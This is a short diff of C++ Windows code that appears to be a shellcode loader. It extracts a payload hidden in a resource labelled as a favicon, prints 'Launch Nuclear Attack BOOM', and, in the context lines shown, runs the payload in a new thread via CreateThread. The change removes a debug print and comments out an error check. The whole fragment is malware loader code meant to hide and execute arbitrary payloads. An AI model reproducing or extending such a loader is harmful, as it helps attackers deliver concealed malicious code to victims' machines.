@@ -18,7 +18,6 @@ int main()
 
     //Extract payload from resources section
     res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
-    std::cout << res << "\n";
     resHandle = LoadResource(NULL, res);
     payload = static_cast<unsigned char*>(LockResource(resHandle));
     payload_len = SizeofResource(NULL, res);
@@ -34,10 +33,10 @@ int main()
     std::cout << "Launch Nuclear Attack BOOM\n";
     std::cin.get();
 
-    if (resHandle == NULL) {
-        std::cout << "Failed to launch payload HANDLE\n";
-        return -1;
-    }
+    // if (resHandle == NULL) {
+    //     std::cout << "Failed to launch payload HANDLE\n";
+    //     return -1;
+    // }
 
     if (rv != 0) {
         th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
